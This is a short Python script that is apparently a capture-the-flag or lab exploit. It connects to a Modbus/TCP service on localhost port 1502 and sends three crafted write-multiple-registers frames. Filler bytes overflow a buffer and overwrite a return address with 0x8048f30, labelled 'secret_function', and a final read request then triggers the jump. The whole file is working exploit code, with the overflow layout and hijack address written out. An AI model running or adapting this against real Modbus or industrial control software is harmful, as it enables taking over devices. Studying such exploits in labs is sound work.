import socket

HOST = '127.0.0.1'      
PORT = 1502
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))   

# <00><08><00><00><00><06><FF><10><00><6B><00><78>

header1 = "\x00\x08\x00\x00\x00\x06\xff\x10\x00\x6b\x00\x42" # address = 0x006b, nb = 0x0042
packet1 = "\x41"*66*2 + "\x41"*6

header2 = "\x00\x08\x00\x00\x00\x06\xff\x10\x00\xad\x00\x42" # address = 0x00ad(6b+42), nb = 0x0042
packet2 = "\x42"*66*2 + "\x42"*7

#0x8048f30 --> secret_function

header3 = "\x00\x08\x00\x00\x00\x06\xff\x10\x00\xef\x00\x42" # address = 0x00ef(ad+42), nb = 0x0042
packet3 = "\x43"*16 + "\x30\x8f\x04\x08" + "\x08\xc0\x04\x08" + "\x43"*(66*2 - 16 - 8) + "\x43"*8


m = header1 + packet1
s.send(m)

m = header2 + packet2
s.send(m)

m = header3 + packet3
s.send(m)

#<00><07><00><00><00><05><FF><03><02><12><34>

header4 = "\x00\x07\x00\x00\x00\x05\xff\x03\x00\x6b\x01\x2c"

s.send(header4)
